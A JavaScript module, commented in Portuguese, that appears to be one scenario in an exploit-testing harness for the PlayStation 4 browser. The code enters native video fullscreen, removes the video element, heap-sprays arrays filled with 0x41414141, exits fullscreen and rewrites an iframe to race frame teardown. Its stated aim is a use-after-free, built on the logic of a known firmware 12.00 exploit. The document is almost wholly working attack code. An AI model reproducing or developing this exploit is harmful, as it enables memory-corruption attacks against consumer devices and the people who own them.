
/**
 * CENÁRIO: VIDEO_FULLSCREEN_REMOVE (Manx Native Fusion)
 * Alvo: MediaPlayerPrivateManx + FrameLoader Teardown
 */

export default {
    id:       'VIDEO_FULLSCREEN_REMOVE',
    category: 'Media',
    risk:     'CRITICAL',
    description: 'Usa a lógica do exploit 12.00 (webkitEnterFullscreen nativo) combinada com ' +
                 'o teardown de iframe assíncrono para causar UAF no hardware gráfico da PS4.',

    setup: async function() {
        this.iframe = document.createElement('iframe');
        this.iframe.setAttribute('allowfullscreen', 'true');
        this.iframe.style.opacity = '0.01';
        document.body.appendChild(this.iframe);

        const doc = this.iframe.contentDocument;
        this.video = doc.createElement('video');
        this.video.src = 'data:video/mp4;base64,AAAAFGZ0eXBtcDQyAAAAAG1wNDIAAAAIZnJlZQAAAAhtZGF0';
        // Atributos importantes para forçar a renderização nativa
        this.video.controls = true;
        this.video.preload = "auto";
        doc.body.appendChild(this.video);

        this.sprayPayload = new Uint32Array(256);
        this.sprayPayload.fill(0x41414141);

        await new Promise(resolve => {
            const timeout = setTimeout(resolve, 400);
            this.video.addEventListener('loadedmetadata', () => {
                clearTimeout(timeout);
                resolve();
            }, { once: true });
        });
    },

    trigger: async function() {
        try {
            // 1. O SEGREDO DO 12.00: Chama o reprodutor nativo (Manx)
            // Tenta forçar a entrada mesmo sem o click explícito, usando fallback
            if (this.video.webkitEnterFullscreen) {
                this.video.webkitEnterFullscreen();
            } else if (this.video.webkitRequestFullscreen) {
                this.video.webkitRequestFullscreen();
            }

            // O tempo de espera que você identificou como crítico
            await new Promise(r => setTimeout(r, 400));

            // 2. FREE: Destruímos o elemento
            this.video.remove();

            // 3. SPRAY: Enchemos a memória de 0x41414141
            this.spray = [];
            for (let i = 0; i < 5000; i++) {
                let arr = new Uint32Array(256);
                arr.set(this.sprayPayload);
                this.spray.push(arr);
            }

            // 4. O ATAQUE DIRETO DO 12.00: Saída nativa do player
            if (this.video.webkitExitFullscreen) {
                this.video.webkitExitFullscreen();
            } else if (document.webkitExitFullscreen) {
                document.webkitExitFullscreen();
            }

            // 5. O TEARDOWN: Substitui o location.reload() do 12.00.
            // Destrói o ambiente do iframe 100ms depois, criando a Race Condition perfeita.
            setTimeout(() => {
                try {
                    this.iframe.contentDocument.write('PWNED');
                    this.iframe.contentDocument.close();
                } catch(e) {}
            }, 100);

        } catch(e) {}
    },

    probe: [
        s => s.video.readyState,
        s => s.video.webkitDecodedFrameCount,
        s => { try { return s.video.buffered.start(0); } catch(e) { return e.name; } }
    ],

    cleanup: function() {
        try { this.iframe.remove(); } catch(e) {}
        this.spray = null;
        this.video = null;
    }
};
